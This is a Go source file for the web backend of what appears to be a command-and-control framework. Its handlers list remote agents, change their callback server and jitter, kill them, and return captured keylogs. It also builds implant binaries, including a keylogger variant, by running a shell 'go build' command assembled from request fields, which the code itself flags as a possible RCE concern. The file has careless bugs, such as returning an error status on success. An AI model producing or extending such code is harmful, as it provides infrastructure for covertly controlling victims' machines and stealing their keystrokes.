package main

import (
	"os/exec"
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func getAgentsHandler(c *gin.Context) {
    // Get all agents
    agents, err := Agents()
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agents"})
        return
    }

    c.JSON(http.StatusOK, gin.H{"data": agents})
    return
}

func getGroupAgents(c *gin.Context) {
    // Get agent groups
    agentGroups, err := GroupAgentsByIp()
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agents"})
        return
    }

    c.JSON(http.StatusOK, gin.H{"data": agentGroups})
    return
}

func getGroupAgentsByIP(c *gin.Context) {
    // Get agents by IP
	ip := c.Param("ip")
    agents, err := AgentsByIp(ip)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agents"})
        return
    }

    c.JSON(http.StatusOK, gin.H{"data": agents})
    return
}

func getOneAgentByUUID(c *gin.Context) {
    // Get agents by UUID
	uuid := c.Param("agt")
	fmt.Println("Trying to find agent", uuid)
    agents, err := FetchOne(uuid)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
        return
    }
	// agents = [{69a124a8-6795-4481-a6a5-1a88e57a6e88 192.168.50.240 600 80    }]
    c.JSON(http.StatusOK, gin.H{"data": agents})
    return
}

func getAgentByUUID(c *gin.Context) {
    // Get agents by UUID
	uuid := c.Param("agt")
	fmt.Println("Trying to find agent", uuid)
    agents, err := Agent(uuid)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
        return
    }

    c.JSON(http.StatusOK, gin.H{"data": agents})
    return
}

func updateAgentHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	newCmdID := uuid.New().String()

	var body map[string]string
	if err := c.BindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
		return
	}

	vsvr := regexp.MustCompile(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}[:](6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$`)
	vserver := vsvr.MatchString(body["callbackserver"])
	vfrequency := regexp.MustCompile(`^\d{1,5}$`)
	vcallbackfrequency := vfrequency.MatchString(body["callbackfreq"])
	vjitter := regexp.MustCompile(`^\d{1,5}$`)
	vcallbackjitter := vjitter.MatchString(body["callbackjitter"])

	if !vserver {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Server IP:Port"})
	} else if !vcallbackfrequency {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Frequency, Max 99999"})
	} else if !vcallbackjitter {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Jitter, Max 100"})
	} else {
		UpdateAgentConfig(agentParam, body["callbackserver"], body["callbackfreq"], body["callbackjitter"])
		SendAgentCommand(agentParam, "0", "update", body["callbackfreq"]+":"+body["callbackjitter"], newCmdID)
		c.JSON(http.StatusOK, gin.H{"message": "Success"})
	}
}

func killAgentHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	newCmdID := uuid.New().String()
	SendAgentCommand(agentParam, "0", "kill", "Kill Agent", newCmdID)
	DeleteAgent(agentParam)
	c.JSON(http.StatusOK, gin.H{"message": "Success"})
}

func getKeylogHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	keylogs := Keylog(agentParam)
	c.JSON(http.StatusOK, gin.H{"data": keylogs})
}

func getPayloadsHandler(c *gin.Context) {
	payloads := Payloads()
	c.JSON(http.StatusOK, gin.H{"data": payloads})
}

func createPayloadHandler(c *gin.Context) {
	publickey := goDotEnvVariable("PUBLIC_KEY")
	newPayID := uuid.New().String()
	var body map[string]string
	if err := c.BindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
		return
	}
	vnm := regexp.MustCompile(`^[a-zA-Z]{1,9}$`)
	vname := vnm.Match([]byte(body["name"]))
	vserverip, _ := regexp.MatchString(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`, body["serverip"])
	vserverport, _ := regexp.MatchString(`^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$`, body["serverport"])
	vfrequency := regexp.MustCompile(`^\d{1,5}$`)
	vcallbackfrequency := vfrequency.Match([]byte(body["callbackfrequency"]))
	vjitter := regexp.MustCompile(`^\d{1,2}$`)
	vcallbackjitter := vjitter.Match([]byte(body["callbackjitter"]))

	if !vserverip {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Server IP"})
	} else if !vserverport {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Server Port"})
	} else if !vcallbackfrequency {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Frequency, Max 99999"})
	} else if !vcallbackjitter {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Jitter, Max 99"})
	} else if !vname {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Name, [a-zA-Z]{1,9}"})
	} else { // else if body["type"] != "original" || body["type"] != "wkeys" {
		// 	res.SendString("Invalid type")
		// }

		tag := strings.Split(newPayID, "-")
		concat := body["name"] + "_" + tag[0]
		var commandString string
		// Possible RCE concern
		if body["type"] == "original" {
			commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175

				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o agents/%s client/client.go",
				body["serverip"],
				body["serverport"],
				body["callbackfrequency"],
				body["callbackjitter"],
				publickey,
				concat,
			)
		} else if body["type"] == "wkeys" {
			commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175

				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o agents/%s client/kclient/kclient.go",
				body["serverip"],
				body["serverport"],
				body["callbackfrequency"],
				body["callbackjitter"],
				publickey,
				concat,
			)
		}
		fmt.Println("body")
		err := exec.Command("sh", "-c", commandString).Run()
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error"})
		}

		CreatePayload(newPayID, body["name"], body["description"], body["serverip"], body["serverport"], body["callbackfrequency"], body["callbackjitter"], concat) // from web
		c.JSON(http.StatusBadRequest, gin.H{"message": "Success"})
	}
}